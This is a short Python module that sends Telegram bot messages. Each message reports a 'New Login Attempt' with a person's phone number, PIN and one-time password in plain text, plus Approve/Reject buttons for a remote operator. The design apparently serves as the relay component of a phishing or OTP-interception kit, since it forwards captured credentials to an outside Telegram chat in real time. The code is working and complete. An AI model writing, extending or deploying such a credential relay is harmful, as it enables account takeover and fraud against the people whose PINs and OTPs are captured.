import os
import httpx

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")


async def send_approval_request(approval_id: str, phone: str, pin: str, otp: str):
    """Send a Telegram message with Approve/Reject inline buttons."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("🔴 Telegram credentials missing.")
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    text = (
        f"🔐 <b>New Login Attempt</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"🔑 PIN: <code>{pin}</code>\n"
        f"🔐 OTP: <code>{otp}</code>\n\n"
        f"Approve this OTP?"
    )
    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ Approve", "callback_data": f"approve:{approval_id}"},
            {"text": "❌ Reject", "callback_data": f"reject:{approval_id}"}
        ]]
    }
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "reply_markup": keyboard,
    }

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, json=payload)
            print(f"🟢 Telegram response: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"🔴 Telegram send error: {e}")


async def answer_callback_query(callback_id: str, text: str):
    """Acknowledge the button press so the spinner stops."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    async with httpx.AsyncClient() as client:
        try:
            await client.post(url, json={"callback_query_id": callback_id, "text": text})
        except Exception as e:
            print(f"Callback answer error: {e}")


async def edit_message(chat_id: int, message_id: int, text: str):
    """Edit the original Telegram message to show the result."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
    }
    async with httpx.AsyncClient() as client:
        try:
            await client.post(url, json=payload)
        except Exception as e:
            print(f"Edit message error: {e}")